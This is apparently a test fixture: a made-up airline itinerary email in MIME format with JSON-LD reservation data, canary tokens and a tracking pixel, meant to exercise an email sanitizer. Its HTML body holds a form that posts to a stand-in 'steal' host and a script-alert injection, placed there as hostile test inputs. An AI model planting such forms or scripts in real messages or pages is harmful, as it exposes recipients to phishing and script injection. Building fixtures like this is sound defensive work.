@@ -1,0 +1,94 @@
+From: Example Air <reservations@example-air.example>
+To: traveller@gmail.example
+Subject: Your itinerary RC4N8W CANARY-SUBJECT-RICH-5P3H
+Date: Mon, 12 Oct 2026 09:30:00 -0400
+Message-ID: <fx-rich_flight@example-air.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============0978824374361752219=="
+
+--===============0978824374361752219==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+CANARY-BODY-RICH-FLIGHT-2J6V. Made-up plain text part.
+
+--===============0978824374361752219==
+MIME-Version: 1.0
+Content-Type: multipart/related;
+ boundary="===============1773858237403329139=="
+
+--===============1773858237403329139==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head><script type=3D"application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "FlightReservation",
+  "reservationNumber": "RC4N8W",
+  "reservationStatus": "http://schema.org/ReservationConfirmed",
+  "modifyReservationUrl": "https://example-air.example/manage/RC4N8W",
+  "underName": {"@type": "Person", "name": "Jane Doe"},
+  "programMembership": {"@type": "ProgramMembership", "memberNumber": "FXLOY-=
+4400123", "program": "Example Miles"},
+  "reservedTicket": {"@type": "Ticket", "ticketedSeat": {"@type": "Seat", "se=
+atNumber": "21C", "seatingType": "Economy"}},
+  "reservationFor": {
+    "@type": "Flight",
+    "flightNumber": "101",
+    "airline": {"@type": "Airline", "name": "Example Air", "iataCode": "EX"},
+    "departureAirport": {"@type": "Airport", "name": "John F. Kennedy", "iata=
+Code": "JFK"},
+    "departureTime": "2026-11-20T19:00:00-05:00",
+    "departureTerminal": "7",
+    "arrivalAirport": {"@type": "Airport", "name": "Heathrow", "iataCode": "L=
+HR"},
+    "arrivalTime": "2026-11-21T07:10:00+00:00"
+  }
+}
+</script><style>.x { display: none }</style></head>
+<body style=3D"margin:0; background-color:#eef2f7" bgcolor=3D"#eef2f7">
+<table width=3D"600" align=3D"center" cellpadding=3D"0" cellspacing=3D"0" sty=
+le=3D"background-color:#ffffff; border:1px solid #d5dbe5; max-width:600px">
+<tr><td><img src=3D"cid:logo@example-air.example" alt=3D"Example Air" width=
+=3D"200" style=3D"display:block"></td></tr>
+<tr><td><img src=3D"https://img.example-air.example/banner.png?t=3DCANARY-IMG=
+URL-9D4T" alt=3D"Spring fares" width=3D"560"></td></tr>
+<tr><td><img src=3D"https://img.example-air.example/pixel.gif?t=3DCANARY-IMGU=
+RL-9D4T" width=3D"1" height=3D"1" alt=3D""></td></tr>
+<tr><td><img src=3D"http://img.example-air.example/insecure.png" alt=3D"Insec=
+ure picture"></td></tr>
+<tr><td><img src=3D"https://inside.example-air.example/internal.png" alt=3D"I=
+nternal picture"></td></tr>
+<tr><td><img src=3D"https://img.example-air.example/redirect.png" alt=3D"Redi=
+rected picture"></td></tr>
+<tr><td><img src=3D"https://img.example-air.example/huge.png" alt=3D"Huge pic=
+ture"></td></tr>
+<tr><td><img src=3D"https://img.example-air.example/page.png" alt=3D"Page pic=
+ture"></td></tr>
+<tr><td><img src=3D"https://img.example-air.example/vector.svg" alt=3D"Vector=
+ picture"></td></tr>
+<tr><td style=3D"padding:24px; font-family:Georgia, serif; color:#1f2937">
+<h1 style=3D"font-size:22px; color:#0b3d91">CANARY-BODY-RICH-FLIGHT-2J6V</h1>
+<p style=3D"font-size:15px">Hello Jane. Your trip is confirmed.</p>
+<p><a href=3D"https://example-air.example/manage" style=3D"color:#0b3d91; fon=
+t-weight:bold">Manage your booking</a></p>
+<form action=3D"https://t.example/steal"><input name=3D"x"><button>Go</button=
+></form>
+<script>alert(1)</script>
+</td></tr></table></body></html>
+
+--===============1773858237403329139==
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-Disposition: inline; filename="logo.png"
+Content-ID: <logo@example-air.example>
+MIME-Version: 1.0
+
+iVBORw0KGgpDQU5BUlktSU1BR0UtQllURVMtNEY4SwABAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZ
+GhscHR4f
+
+--===============1773858237403329139==--
+
+--===============0978824374361752219==--
